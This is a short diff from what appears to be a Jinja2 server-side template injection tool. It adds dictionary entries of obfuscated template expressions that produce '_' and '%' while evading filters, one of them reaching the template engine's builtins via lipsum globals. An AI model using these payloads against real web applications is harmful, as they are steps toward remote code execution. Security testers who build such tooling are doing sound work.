@@ -53,10 +53,12 @@ context_payloads_all: ContextPayloads = {
     "{%set e=(dict(a=x,b=x,c=x)|count)%}": {"e": 3},
     "{%set l={}|escape|first|count%}": {"l": 1},
     "{%set un=((({}|select()|trim|list)[24]))%}": {"un": "_"},
-    "{%set perc=(lipsum[((({}|select()|trim|list)[24]))*2+"
+    "{%set unn=(lipsum|escape|batch(22)|list|first|last)%}": {"unn": "_"},
+    "{%set perc=(lipsum()|urlencode|first)%}": {"perc": "%"},
+    "{%set percc=(lipsum[((({}|select()|trim|list)[24]))*2+"
     + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
     + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
-    + ")[24]))*2][dict(chr=x)|join](37))%}": {"perc": "%"},
+    + ")[24]))*2][dict(chr=x)|join](37))%}": {"percc": "%"},
 }
 
 
